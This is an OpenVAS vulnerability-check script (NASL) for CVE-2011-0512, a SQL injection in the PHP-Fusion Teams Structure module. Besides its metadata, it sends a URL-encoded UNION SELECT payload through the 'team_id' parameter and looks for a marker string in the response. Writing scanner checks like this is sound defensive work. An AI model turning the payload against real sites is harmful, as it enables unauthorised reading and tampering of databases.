##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_php_fusion_team_structure_sql_inj_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# PHP-Fusion Teams Structure Module 'team_id' SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:php-fusion:php-fusion";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902366");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-05-02 12:20:04 +0200 (Mon, 02 May 2011)");
  script_cve_id("CVE-2011-0512");
  script_bugtraq_id(45826);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("PHP-Fusion Teams Structure Module 'team_id' SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42943");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/64727");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16004/");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_php_fusion_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("php-fusion/installed");

  script_tag(name:"insight", value:"The flaw is due to input passed via the 'team_id' parameter to
  'infusions/teams_structure/team.php' is not properly sanitised before being
  used in SQL queries.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running PHP-Fusion Teams Structure Module and is prone
  to SQL injection vulnerability.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to to view,
  add, modify or delete information in the back-end database.");
  script_tag(name:"affected", value:"PHP-Fusion Teams Structure 3.0");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/files/infusions/teams_structure/team.php?team_id=" +
            "-1%27%0Aunion+select%0A%271%27%2C%272%27%2C%273%27%2C%274%27%2C%27" +
            "SQL-INJECTION-TEST%27%2C%276%27%2C%277%27%2C%278%27%2C%279%27%2C%27" +
            "10%27%2C%2711%27%2C%2712%27%2C%2713%27%2C%2714%27%2C%2715%27%2C%27" +
            "16%27%2C%2717";

sndReq = http_get( item:url, port );
rcvRes = http_keepalive_send_recv( port:port, data:sndReq );

if( ">SQL-INJECTION-TEST<" >< rcvRes ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );